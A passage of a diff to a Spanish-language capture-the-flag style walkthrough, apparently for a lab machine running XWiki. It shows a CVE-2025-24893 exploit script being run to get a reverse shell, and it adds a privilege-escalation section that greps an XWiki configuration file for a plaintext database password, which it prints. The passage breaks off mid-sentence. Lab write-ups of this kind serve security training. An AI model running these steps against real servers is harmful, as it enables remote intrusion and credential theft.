@@ -22,6 +22,11 @@ Después deberemos ejecutar el Python
 `python3 cve-2025-24893.py <target_base_url> <lhost> <lport>`
 
 En nuestro listenner obtendremos una Shell como `xWiki`
+
+## Escalada de Privilegios
 Si navegamos al directorio `/home` vemos que hay un usuario `Oliver`, para poder pivotar a el, buscaremos información en los archivos de configuración de `xWiki`
 
-Estos ficheros de configuracion se encuentran en `/usr/lib/xwiki` exactamente miraremos el archivo 
+Estos ficheros de configuración se encuentran en `/usr/lib/xwiki/WEB-INF` exactamente miraremos el archivo `hibernate.cfg.xml`
+En este archivo filtraremos por la palabra `password`
+`cat hibernate.cfg.xml | grep "password"` encontramos una línea que nos indica la siguiente contraseña `theEd1t0rTeam99`
+Como 
